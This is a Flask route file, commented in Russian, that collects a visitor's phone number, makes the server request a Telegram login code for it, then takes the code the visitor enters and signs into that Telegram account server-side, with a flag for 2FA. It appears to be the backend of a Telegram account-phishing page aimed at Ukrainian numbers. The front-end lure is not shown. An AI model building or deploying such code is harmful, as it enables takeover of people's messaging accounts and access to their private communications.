import re
import random
import asyncio
from flask import Blueprint, request, render_template, jsonify
from services.telegram_service import send_code_telethon, sign_in_telethon

main_bp = Blueprint('main', __name__)

# Память сервера для хранения hash (sid -> {phone, hash})
active_sessions = {}

@main_bp.route('/')
def index():
    return render_template("index.html")

@main_bp.route('/api/send_code', methods=['POST'])
def handle_send_code():
    try:
        # 1. Получаем JSON данные
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'Пустой запрос'}), 400

        # 2. Очищаем номер
        raw_phone = data.get('phone', '')
        phone = re.sub(r'\D', '', raw_phone)
        if len(phone) == 9: phone = '380' + phone
        elif phone.startswith('0'): phone = '38' + phone

        sid = str(random.randint(100000, 999999))

        # 3. Запускаем асинхронную задачу
        # asyncio.run() - самый безопасный способ избежать 500 ошибки на VDS
        result = asyncio.run(send_code_telethon(phone, sid))

        if result and result.get('status') == 'success':
            active_sessions[sid] = {
                'phone': phone, 
                'hash': result.get('hash')
            }
            return jsonify({'status': 'success', 'sid': sid})
        
        return jsonify({'status': 'error', 'message': result.get('message')}), 200

    except Exception as e:
        print(f"ОШИБКА СЕРВЕРА: {e}")
        return jsonify({'status': 'error', 'message': 'Ошибка на стороне сервера'}), 500

@main_bp.route('/api/verify', methods=['POST'])
def handle_verify():
    try:
        data = request.get_json()
        sid = data.get('sid')
        code = data.get('code')
        
        if sid not in active_sessions:
            return jsonify({'status': 'error', 'message': 'Сессия не найдена'}), 400
        
        session_data = active_sessions[sid]
        
        # Запускаем вход
        result = asyncio.run(sign_in_telethon(
            code, 
            sid, 
            session_data['phone'], 
            session_data['hash']
        ))
        
        if result.get('status') == 'success':
            return jsonify({'status': 'success'})
        elif result.get('status') == 'password_needed':
            return jsonify({'status': 'need_2fa'})
        
        return jsonify({'status': 'error', 'message': result.get('message')})
    except Exception as e:
        print(f"ОШИБКА ВЕРИФИКАЦИИ: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500